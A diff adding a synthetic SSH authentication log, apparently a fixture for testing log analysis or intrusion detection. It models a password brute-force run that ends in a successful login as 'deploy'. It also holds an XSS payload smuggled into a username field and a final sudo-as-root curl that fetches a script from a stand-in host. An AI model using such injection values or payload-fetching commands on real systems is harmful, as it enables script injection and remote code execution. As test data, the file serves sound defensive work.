@@ -1,0 +1,21 @@
+Oct 23 18:00:30 web-01 sshd[3001]: Accepted publickey for bob from 10.20.0.41 port 50122 ssh2: ED25519 SHA256:synthetic
+Oct 23 18:02:09 web-01 sshd[3100]: Invalid user admin from 203.0.113.45 port 40100
+Oct 23 18:02:09 web-01 sshd[3100]: Failed password for invalid user admin from 203.0.113.45 port 40100 ssh2
+Oct 23 18:02:19 web-01 sshd[3101]: Failed password for root from 203.0.113.45 port 40101 ssh2
+Oct 23 18:02:34 web-01 sshd[3102]: Failed password for deploy from 203.0.113.45 port 40102 ssh2
+Oct 23 18:02:45 web-01 sshd[3103]: Invalid user test from 203.0.113.45 port 40103
+Oct 23 18:02:45 web-01 sshd[3103]: Failed password for invalid user test from 203.0.113.45 port 40103 ssh2
+Oct 23 18:02:57 web-01 sshd[3104]: Invalid user admin from 203.0.113.45 port 40104
+Oct 23 18:02:57 web-01 sshd[3104]: Failed password for invalid user admin from 203.0.113.45 port 40104 ssh2
+Oct 23 18:03:08 web-01 sshd[3105]: Failed password for root from 203.0.113.45 port 40105 ssh2
+Oct 23 18:03:22 web-01 sshd[3106]: Failed password for deploy from 203.0.113.45 port 40106 ssh2
+Oct 23 18:03:39 web-01 sshd[3107]: Invalid user oracle from 203.0.113.45 port 40107
+Oct 23 18:03:39 web-01 sshd[3107]: Failed password for invalid user oracle from 203.0.113.45 port 40107 ssh2
+Oct 23 18:03:55 web-01 sshd[3108]: Invalid user admin from 203.0.113.45 port 40108
+Oct 23 18:03:56 web-01 sshd[3108]: Failed password for invalid user admin from 203.0.113.45 port 40108 ssh2
+Oct 23 18:04:05 web-01 sshd[3109]: Failed password for deploy from 203.0.113.45 port 40109 ssh2
+Oct 23 18:04:12 web-01 sshd[3120]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 40120 ssh2]
+Oct 23 18:04:18 web-01 sshd[3121]: Failed password for invalid user <img src=x onerror=alert('nv-auth')> from 203.0.113.45 port 40121 ssh2
+Oct 23 18:04:39 web-01 sshd[3130]: Accepted password for deploy from 203.0.113.45 port 40130 ssh2
+Oct 23 18:04:40 web-01 sshd[3130]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+Oct 23 18:06:14 web-01 sudo[3140]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://update-cdn.example/agent.sh
